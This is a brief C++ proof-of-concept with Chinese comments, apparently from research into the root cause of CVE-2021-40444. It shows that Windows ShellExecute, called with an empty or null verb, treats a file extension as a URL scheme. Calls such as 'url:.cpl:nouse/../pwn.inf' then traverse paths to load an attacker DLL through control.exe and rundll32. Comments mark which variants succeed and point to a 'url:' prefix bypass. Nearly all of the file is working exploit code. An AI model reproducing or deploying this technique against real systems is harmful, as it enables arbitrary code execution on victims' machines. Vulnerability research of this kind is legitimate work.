/*
tested on windows 10 x64 10.0.19041.1237 

ShellExecute POC
大致原理:
    ShellExecute 系列函数在空 lpVerb/lpOp 的情况下, 会将注册表中 CLASS_ROOT下的所有项都解析成url协议
    并且在路径拼接的情况下可以遍历盘符路径

预期效果:
    将后缀名当成 url scheme, 执行本地任意文件

refer: 
    关于 CVE-2021-40444 Root Cause 研究
*/

#include <iostream>
#include <windows.h>

int main() {
    // pwn.inf是和当前程序同路径下的DLL, .cpl借用control.exe -> rundll32这个路径进行加载

    ShellExecuteA(NULL, "", "url:.cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Succeed, 前面加url这是一种可能的绕过手段
    ShellExecuteA(NULL, NULL, ".cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Succeed

    ShellExecuteA(NULL, "Open", "url:.cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Failed
    ShellExecuteA(NULL, "Open", ".cpl:nouse/../pwn.inf", NULL, NULL, SW_SHOW); //Failed
}